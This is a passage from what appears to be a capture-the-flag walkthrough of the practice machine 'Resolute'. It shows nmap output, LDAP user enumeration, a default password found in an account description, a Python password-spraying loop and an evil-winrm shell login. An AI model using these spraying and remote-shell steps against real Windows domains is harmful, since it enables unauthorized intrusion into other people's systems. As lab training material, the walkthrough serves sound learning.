49860/tcp open tcpwrapped
49907/tcp open msrpc Microsoft Windows RPC
1 service unrecognized despite returning data.
If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port53-TCP:
     V=7.80%
     I=7%
     D=12/21%
     Time=5DFE9733%
     P=x86_64-apple-darwin17.7.0
     SF:%r(DNSVersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07v
     SF:ersion\x04bind\0\0\x10\0\x03&quot;);

Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 2h47m28s, deviation: 4h37m09s, median: 7m27s
| smb-os-discovery:
     | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
     | Computer name: Resolute
     | NetBIOS computer name: RESOLUTE\x00
     | Domain name: megabank.local
     | Forest name: megabank.local
     | FQDN: Resolute.megabank.local
     |_ System time: 2019-12-21T14:13:46-08:00
| smb-security-mode:
     | account_used: &lt;blank&gt;
     | authentication_level: user
     | challenge_response: supported
     |_ message_signing: required
| smb2-security-mode:
     | 2.02:
     |_ Message signing enabled and required
| smb2-time:
     | date: 2019-12-21T22:13:45
     |_ start_date: 2019-12-21T21:06:24

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.55 seconds
</code></pre>
<!--kg-card-end: markdown--><p>This enumeration also revealed that the machine's name is Resolute and the Domain/Forest name is megabank.local.</p><p>Since we think this machine is a Domain Controller, we try to enumerate the users in the Domain using the <a href="https://github.com/ropnop/windapsearch">windapsearch.py</a> script.</p><blockquote><code>windapsearch</code> is a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries. By default, Windows Domain Controllers support basic LDAP operations through port 389/tcp. With any valid domain account (regardless of privileges), it is possible to perform LDAP queries against a domain controller for any AD related information.</blockquote><!--kg-card-begin: markdown--><pre><code>python2 ./windapsearch.py -d Resolute.megabank.local --dc-ip 10.10.10.169 --full --attrs 'badPwdCount,lastLogon' --users
</code></pre>
<!--kg-card-end: markdown--><p>This allowed us to find a list with details about all users including full name and description. Here, we came across something very interesting:</p><!--kg-card-begin: markdown--><pre><code>userPrincipalName: marko@megabank.local
displayName: Marko Novak
description: Account created. Password set to Welcome123!
</code></pre>
<!--kg-card-end: markdown--><p>So, we tried to use this password to authenticate marko using the same script:</p><!--kg-card-begin: markdown--><pre><code>python2 ./windapsearch.py -d Resolute.megabank.local --dc-ip 10.10.10.169 --user marko@megabank.local --password Welcome123!
</code></pre>
<!--kg-card-end: markdown--><p>Since this failed, we tried to use the same password to authenticate the other known users:</p><!--kg-card-begin: markdown--><pre><code>import os

names = [ 'ryan', 'marko', 'sunita', 'abigail', 'marcus', 'sally', 'fred', 'angela', 'felicia', 'gustavo', 'ulf', 'stevie', 'claire', 'paulo', 'steve', 'annette', 'annika', 'per', 'claude', 'melanie', 'zach', 'simon', 'naoki' ]

for name in names:
    full_usr = name + '@megabank.local'
    print('Trying password Welcome123! with user ' + full_usr)
    os.system('python2 windapsearch.py -d Resolute.megabank.local --dc-ip 10.10.10.169 --user ' + full_usr  + ' --password Welcome123!')
</code></pre>
<!--kg-card-end: markdown--><p>This succeeded for melanie:</p><!--kg-card-begin: markdown--><pre><code>Trying password Welcome123! with user melanie@megabank.local
[+] Using Domain Controller at: 10.10.10.169
[+] Getting defaultNamingContext from Root DSE
[+] Found: DC=megabank,DC=local
[+] Attempting bind
[+] ...success! Binded as:
[+] u:MEGABANK\melanie

[*] Bye!
</code></pre>
<!--kg-card-end: markdown--><p>As you can see, we're being booted out from the machine as soon as we authenticate, which we were able to surpass using <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>:</p><!--kg-card-begin: markdown--><pre><code>$ ruby evil-winrm.rb -i 10.10.10.169 -u melanie@megabank.local -p 'Welcome123!'

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

Evil-WinRM* PS C:\Users\melanie\Desktop&gt; cat user.txt
</code></pre>
<!--kg-card-end: markdown-->]]></content:encoded></item></channel></rss>